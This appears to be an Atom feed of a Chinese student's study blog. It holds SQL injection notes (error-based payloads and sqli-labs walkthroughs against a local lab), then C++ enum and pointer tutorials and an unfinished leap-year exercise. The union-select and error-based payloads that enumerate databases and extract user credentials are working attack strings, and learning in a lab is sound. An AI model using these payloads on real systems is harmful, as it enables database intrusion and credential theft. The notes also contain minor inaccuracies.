<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦的小屋</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-11-07T08:34:21.256Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>晨曦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sql注入方式</title>
    <link href="http://example.com/2024/11/07/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2024/11/07/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2024-11-07T16:40:52.000Z</published>
    <updated>2024-11-07T08:34:21.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="1-通过floor报错"><a href="#1-通过floor报错" class="headerlink" title="(1). 通过floor报错"></a>(1). 通过floor报错</h2><p>and (select 1 from (select count(*),concat((payload) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)</p><p>其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</p><h2 id="2-通过updatexml报错"><a href="#2-通过updatexml报错" class="headerlink" title="(2). 通过updatexml报错"></a>(2). 通过updatexml报错</h2><p>and updatexml(1,payload,1)</p><p>同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p><h2 id="3-通过ExtractValue报错"><a href="#3-通过ExtractValue报错" class="headerlink" title="(3). 通过ExtractValue报错"></a>(3). 通过ExtractValue报错</h2><p>and extractvalue(1, payload)</p><p>输出字符有长度限制，最长32位。 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>sql靶场第一题思路</title>
    <link href="http://example.com/2024/11/07/sql%E6%B3%A8%E5%85%A5/study1/"/>
    <id>http://example.com/2024/11/07/sql%E6%B3%A8%E5%85%A5/study1/</id>
    <published>2024-11-07T09:40:02.000Z</published>
    <updated>2024-11-07T08:34:21.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><ol><li><p>url为 <a class="link"   href="http://127.0.0.1/?/id=1" >http://127.0.0.1?/id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;1时，没有报错</p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;2时，没有报错</p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ 时,报错说明是字符型注入</p></li></ol><h1 id="后台查询列数"><a href="#后台查询列数" class="headerlink" title="后台查询列数"></a>后台查询列数</h1><p>使用order by试出数据库列数</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ order by 数字–+ （如果试4时有错误，3时正确，那么列数为3）</p><h1 id="找显示位"><a href="#找显示位" class="headerlink" title="找显示位"></a>找显示位</h1><p>使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=-1" >http://127.0.0.1/?id=-1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,3–+</p><p>加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据（将id弄成负数，使前面的语句失效）</p><h1 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h1><p>联合查询：select database();</p><p>下面是查看数据库的版本和数据库信息</p><p>假如显示位是3，<a class="link"   href="http://127.0.0.1/?id=-1" >http://127.0.0.1/?id=-1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,version,database()–+</p><p>我们发现名字可能叫users</p><h1 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h1><p>找到库名以后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’库名’–+ (如果库名是字符型，此处库名要转成十六进制)</p><p>我们发现username和password字段</p><p>information_schema:</p><p>这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p><h1 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h1><p>找到表之后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,column_name from information_schema.columns where table_name&#x3D;’表名’–+ (如果表名是字符型，此处库名要转成十六进制)</p><p>如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息</p><p>查具体数据</p><p>找到列之后，使用<a class="link"   href="http://127.0.0.1/sqli-labs/Less-2/?id=1" >http://127.0.0.1/sqli-labs/Less-2/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(“要查询的数据”) from 表名 –+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sql靶场第二题思路</title>
    <link href="http://example.com/2024/11/07/sql%E6%B3%A8%E5%85%A5/study2/"/>
    <id>http://example.com/2024/11/07/sql%E6%B3%A8%E5%85%A5/study2/</id>
    <published>2024-11-07T09:40:02.000Z</published>
    <updated>2024-11-07T08:34:21.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><ol><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1%27%E6%97%B6%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%A4%9A%E4%BD%99%E7%9A%84%22%E5%8D%95%E5%BC%95%E5%8F%B7%22%E4%BD%BF%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E9%94%99%E8%AF%AF" >http://127.0.0.1/?id=1&#39;时，因为有一个多余的&quot;单引号&quot;使查询语句错误 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;1时，没有报错</p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;2时，由于1&#x3D;2不成立，也会报错</p></li></ol><p>满足这三个，基本上就是数字注入了</p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><ol><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1%27%E6%97%B6%EF%BC%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%A4%E4%B8%BAid%E5%8F%AB%E5%81%9A1%27%E3%80%82%E6%9F%A5%E8%AF%A2%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B8%AAid%E8%80%8C%E8%BF%94%E5%9B%9E%E9%94%99%E8%AF%AF%E3%80%82%EF%BC%88%E5%9C%A8%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%B8%AD%EF%BC%8C%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E5%BC%95%E5%8F%B7%E7%9A%84%E9%97%AD%E5%90%88%EF%BC%89" >http://127.0.0.1/?id=1&#39;时，数据库认为id叫做1&#39;。查询之后发现没有这个id而返回错误。（在字符型注入中，需要考虑引号的闭合） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ and ‘1’&#x3D;’1 在’1’&#x3D;’1之后没有加上’是因为传参时输入的内容已经被’ ‘包围。</p></li></ol><h1 id="后台查询列数"><a href="#后台查询列数" class="headerlink" title="后台查询列数"></a>后台查询列数</h1><p>使用order by试出数据库列数</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ order by 数字 （如果试4时有错误，3时正确，那么列数为3）</p><h1 id="找显示位"><a href="#找显示位" class="headerlink" title="找显示位"></a>找显示位</h1><p>使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,3</p><p>加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据</p><h1 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h1><p>联合查询：select database();</p><p>下面是查看数据库的版本和数据库信息</p><p>假如显示位是3，<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,version,database()</p><h1 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h1><p>找到库名以后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’库名’ (如果库名是字符型，此处库名要转成十六进制)</p><p>information_schema:</p><p>这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p><h1 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h1><p>找到表之后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,column_name from information_schema.columns where table_name&#x3D;’表名’ (如果表名是字符型，此处库名要转成十六进制)</p><p>如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息</p><p>查具体数据</p><p>找到列之后，使用<a class="link"   href="http://127.0.0.1/sqli-labs/Less-2/?id=1" >http://127.0.0.1/sqli-labs/Less-2/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(“要查询的数据”) from 表名</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sql注入一般步骤</title>
    <link href="http://example.com/2024/11/07/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/"/>
    <id>http://example.com/2024/11/07/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/</id>
    <published>2024-11-07T09:38:53.000Z</published>
    <updated>2024-11-07T08:34:21.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sql注入一般步骤："><a href="#sql注入一般步骤：" class="headerlink" title="sql注入一般步骤："></a>sql注入一般步骤：</h1><h2 id="第一步：通过特殊的数据库查询语句"><a href="#第一步：通过特殊的数据库查询语句" class="headerlink" title="第一步：通过特殊的数据库查询语句"></a>第一步：通过特殊的数据库查询语句</h2><h2 id="第二步：在数据库的错误返回中找到sql漏洞"><a href="#第二步：在数据库的错误返回中找到sql漏洞" class="headerlink" title="第二步：在数据库的错误返回中找到sql漏洞"></a>第二步：在数据库的错误返回中找到sql漏洞</h2><h2 id="第三步-利用sql语句猜解管理人员信息并登录管理员后台"><a href="#第三步-利用sql语句猜解管理人员信息并登录管理员后台" class="headerlink" title="第三步:利用sql语句猜解管理人员信息并登录管理员后台"></a>第三步:利用sql语句猜解管理人员信息并登录管理员后台</h2><hr><h1 id="基础语法-待补充"><a href="#基础语法-待补充" class="headerlink" title="基础语法(待补充)"></a>基础语法(待补充)</h1><p>version():查看数据库版本</p><p>database():查看使用的数据库</p><p>user():查看当前用户</p><p>limit:limit子句分批来获取所有数据</p><p>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表</p><p>table_name:表名</p><p>table_schema:数据库名</p><p>column_name:字段名</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>enum</title>
    <link href="http://example.com/2024/11/05/c%E2%81%84c++/%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8Benum/"/>
    <id>http://example.com/2024/11/05/c%E2%81%84c++/%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8Benum/</id>
    <published>2024-11-05T18:40:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在C++中，<code>enum</code>（枚举）是一种用户定义的类型，它允许程序员为整型值指定更易读的名字。枚举类型主要用于表示一组命名的整数常量，使得代码更加清晰和易于维护。</p><h3 id="定义枚举"><a href="#定义枚举" class="headerlink" title="定义枚举"></a>定义枚举</h3><p>你可以使用<code>enum</code>关键字来定义一个枚举类型。下面是一个简单的例子：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    RED,</span><br><span class="line">    GREEN,</span><br><span class="line">    BLUE</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Color myColor = RED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (myColor == RED) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The color is red.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个例子中，<code>Color</code>是一个枚举类型，它有三个可能的值：<code>RED</code>、<code>GREEN</code>和<code>BLUE</code>。</p><h3 id="枚举的底层实现"><a href="#枚举的底层实现" class="headerlink" title="枚举的底层实现"></a>枚举的底层实现</h3><p>默认情况下，枚举值从0开始递增。因此，在上面的例子中，<code>RED</code>的值为0，<code>GREEN</code>的值为1，<code>BLUE</code>的值为2。你也可以显式地指定枚举值：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    RED = <span class="number">1</span>,</span><br><span class="line">    GREEN = <span class="number">2</span>,</span><br><span class="line">    BLUE = <span class="number">4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>在这个修改后的例子中，<code>RED</code>的值为1，<code>GREEN</code>的值为2，<code>BLUE</code>的值为4。</p><h3 id="枚举类型的使用"><a href="#枚举类型的使用" class="headerlink" title="枚举类型的使用"></a>枚举类型的使用</h3><p>枚举类型可以用于变量声明、函数参数和返回值等。例如：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line">    NORTH,</span><br><span class="line">    SOUTH,</span><br><span class="line">    EAST,</span><br><span class="line">    WEST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Direction <span class="title">getOppositeDirection</span><span class="params">(Direction dir)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (dir) &#123;</span><br><span class="line">        <span class="keyword">case</span> NORTH:</span><br><span class="line">            <span class="keyword">return</span> SOUTH;</span><br><span class="line">        <span class="keyword">case</span> SOUTH:</span><br><span class="line">            <span class="keyword">return</span> NORTH;</span><br><span class="line">        <span class="keyword">case</span> EAST:</span><br><span class="line">            <span class="keyword">return</span> WEST;</span><br><span class="line">        <span class="keyword">case</span> WEST:</span><br><span class="line">            <span class="keyword">return</span> EAST;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> NORTH; <span class="comment">// 默认返回北方向，虽然这里不会发生</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Direction currentDirection = EAST;</span><br><span class="line">    Direction oppositeDirection = <span class="built_in">getOppositeDirection</span>(currentDirection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oppositeDirection == WEST) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The opposite direction of EAST is WEST.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="枚举类（C-11及以后）"><a href="#枚举类（C-11及以后）" class="headerlink" title="枚举类（C++11及以后）"></a>枚举类（C++11及以后）</h3><p>C++11引入了<code>enum class</code>，它提供了更强的类型安全和作用域控制。与普通的枚举不同，<code>enum class</code>的枚举值不会隐式地转换为整数，也不会与其他枚举类型相互转换。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    SPRING,</span><br><span class="line">    SUMMER,</span><br><span class="line">    AUTUMN,</span><br><span class="line">    WINTER</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Season currentSeason = Season::SPRING;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (currentSeason == Season::SPRING) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The current season is spring.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面的代码会导致编译错误，因为Season::SPRING不能隐式转换为int</span></span><br><span class="line">    <span class="comment">// int seasonValue = Season::SPRING; // 错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个例子中，<code>Season</code>是一个<code>enum class</code>类型，它的值（如<code>Season::SPRING</code>）必须显式地使用<code>Season::</code>前缀来引用。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>枚举（<code>enum</code>）提供了一种定义命名整数常量的方法。</li><li>枚举值默认从0开始递增，但也可以显式指定。</li><li><code>enum class</code>（C++11及以后）提供了更强的类型安全和作用域控制。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>cpp指针</title>
    <link href="http://example.com/2024/10/31/c%E2%81%84c++/cpp%E6%8C%87%E9%92%88/"/>
    <id>http://example.com/2024/10/31/c%E2%81%84c++/cpp%E6%8C%87%E9%92%88/</id>
    <published>2024-10-31T21:13:03.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>指针是 C++ 中一种非常重要的概念，它可以让你直接操作内存。下面是指针的详细介绍和常见用法。</p><h3 id="1-指针的定义"><a href="#1-指针的定义" class="headerlink" title="1. 指针的定义"></a>1. 指针的定义</h3><p>指针是一个变量，其值为另一个变量的地址。通过指针，可以间接访问该变量。指针的声明语法如下：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">类型 *指针名;</span><br></pre></td></tr></table></figure></div><p>例如：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *p; <span class="comment">// p 是一个指向 int 类型的指针</span></span><br></pre></td></tr></table></figure></div><h3 id="2-指针的初始化"><a href="#2-指针的初始化" class="headerlink" title="2. 指针的初始化"></a>2. 指针的初始化</h3><p>指针必须被初始化后才能使用。可以通过取地址运算符 <code>&amp;</code> 来获取一个变量的地址：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a; <span class="comment">// p 指向 a 的地址</span></span><br></pre></td></tr></table></figure></div><h3 id="3-解引用指针"><a href="#3-解引用指针" class="headerlink" title="3. 解引用指针"></a>3. 解引用指针</h3><p>使用解引用运算符 <code>*</code> 可以访问指针所指向的变量的值：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> value = *p; <span class="comment">// value 现在是 10</span></span><br></pre></td></tr></table></figure></div><h3 id="4-指针的算术运算"><a href="#4-指针的算术运算" class="headerlink" title="4. 指针的算术运算"></a>4. 指针的算术运算</h3><p>指针可以进行算术运算。例如，如果有一个指针指向一个数组的首元素，可以通过指针加法来访问数组的其他元素：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> arr[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> *p = arr; <span class="comment">// p 指向 arr 的首元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问数组元素</span></span><br><span class="line"><span class="type">int</span> first = *p;      <span class="comment">// 1</span></span><br><span class="line"><span class="type">int</span> second = *(p + <span class="number">1</span>); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></div><h3 id="5-指向指针的指针"><a href="#5-指向指针的指针" class="headerlink" title="5. 指向指针的指针"></a>5. 指向指针的指针</h3><p>指针还可以指向其他指针，形成指向指针的指针（double pointer）：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> **pp = &amp;p; <span class="comment">// pp 是一个指向指针 p 的指针</span></span><br></pre></td></tr></table></figure></div><h3 id="6-动态内存分配"><a href="#6-动态内存分配" class="headerlink" title="6. 动态内存分配"></a>6. 动态内存分配</h3><p>使用指针可以动态分配内存，常用的有 <code>new</code> 和 <code>delete</code>：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>; <span class="comment">// 动态分配一个 int</span></span><br><span class="line">*p = <span class="number">10</span>;          <span class="comment">// 给它赋值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> p;       <span class="comment">// 释放内存</span></span><br></pre></td></tr></table></figure></div><p>对于数组，可以这样：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *arr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>]; <span class="comment">// 动态分配一个 int 数组</span></span><br><span class="line"><span class="keyword">delete</span>[] arr;          <span class="comment">// 释放数组内存</span></span><br></pre></td></tr></table></figure></div><h3 id="7-注意事项"><a href="#7-注意事项" class="headerlink" title="7. 注意事项"></a>7. 注意事项</h3><ul><li><strong>野指针</strong>：未初始化或已经被释放的指针称为野指针，使用野指针会导致未定义行为。</li><li><strong>内存泄漏</strong>：动态分配内存后要确保及时释放，避免内存泄漏。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>作业</title>
    <link href="http://example.com/2024/10/22/c%E2%81%84c++/cpp%E4%BD%9C%E4%B8%9A1/"/>
    <id>http://example.com/2024/10/22/c%E2%81%84c++/cpp%E4%BD%9C%E4%B8%9A1/</id>
    <published>2024-10-22T20:30:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。"><a href="#从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。" class="headerlink" title="从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。"></a>从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。</h1><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    cin&gt;&gt;year;</span><br><span class="line">    <span class="keyword">if</span>((year%<span class="number">4</span>==<span class="number">0</span> <span class="keyword">and</span> year%<span class="number">100</span>!=<span class="number">0</span>) <span class="keyword">or</span> year%<span class="number">400</span>==<span 